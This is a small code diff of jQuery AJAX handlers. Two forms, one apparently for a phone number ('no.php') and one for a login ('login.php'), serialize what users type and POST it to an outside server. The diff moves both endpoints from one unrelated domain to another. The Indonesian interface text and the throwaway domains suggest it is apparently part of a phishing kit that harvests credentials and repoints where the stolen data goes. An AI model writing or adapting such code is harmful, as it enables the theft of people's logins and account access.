@@ -9,7 +9,7 @@ $('.load').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://axcellent.dvnet.org/app42/no.php',
+            url: 'https://axcellent.cf-pow.cfd/app42/no.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
@@ -31,7 +31,7 @@ $('.load').fadeIn();
  document.getElementById('kirims').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://axcellent.dvnet.org/app42/login.php',
+            url: 'https://axcellent.cf-pow.cfd/app42/login.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
